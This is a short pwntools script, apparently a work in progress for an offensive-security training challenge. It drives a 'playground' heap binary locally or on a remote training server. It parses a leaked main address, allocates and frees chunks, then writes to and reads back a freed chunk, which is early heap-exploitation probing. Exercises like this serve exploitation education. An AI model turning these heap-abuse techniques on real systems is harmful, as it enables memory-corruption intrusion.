#! /usr/bin/python3
import pwn
import sys

def malloc(nbytes):
    r.sendline("malloc " + str(nbytes))
    out = r.recv()
    pwn.log.debug(out)
    out = out[out.rfind(b'x')+1:out.rfind(b'\n')]
    pwn.log.debug(out)
    out = out.decode('ascii')
    pwn.log.debug(out)
    out = bytes.fromhex(out)
    pwn.log.debug(out)
    out = (8-len(out))*b'\x00'+out
    pwn.log.debug(out)
    out = pwn.packing.u64(out, endianness="big")
    pwn.log.debug(out)
    return out

def show(address, nbytes):
    r.sendline("show "+str(hex(address))+" "+str(nbytes))
    out = r.recv()
    return out

def write(address, payload):
    r.sendline("write "+str(hex(address))+" "+str(len(payload)))
    r.recv()
    r.send(payload)
    r.recv()


def free(address):
    r.sendline("free " + str(hex(address)))
    r.recv()

#def read(address):

pwn.context.terminal = ['tmux', 'split-window', '-h']
args = sys.argv
if "remote" not in args:
    r = pwn.process("./playground")
    pwn.context.log_level = "DEBUG"
    pwn.context.arch = "amd64"
    if "gdb" in args:
        print("debug")
        gdb = pwn.gdb.attach(r, '''
        b main
        ''')
else:
    r = pwn.remote("bin.training.offdef.it", 10101)

main_leak = r.recv()
main_leak = main_leak[main_leak.rfind(b'main')+6:main_leak.rfind(b'\n')]
pwn.log.debug(main_leak.hex())
address1 = malloc(20)
address2 = malloc(20)
address3 = malloc(20)
free(address1)
free(address2)
free(address3)
write(address1, b'abcd')
out = show(address1, 4)
pwn.log.debug(out)

print(hex(address1))
r.interactive()
